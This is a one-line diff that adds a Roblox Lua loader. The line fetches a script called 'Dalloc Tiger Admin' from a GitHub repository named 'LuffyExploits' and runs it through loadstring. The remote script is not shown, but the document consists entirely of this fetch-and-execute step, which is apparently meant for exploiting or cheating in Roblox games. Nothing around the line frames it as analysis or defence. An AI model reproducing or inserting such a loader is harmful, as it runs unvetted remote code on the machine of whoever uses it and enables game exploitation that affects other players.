@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/Riotscripter/LuffyExploits/main/Dalloc%20Tiger%20Admin"),true))()
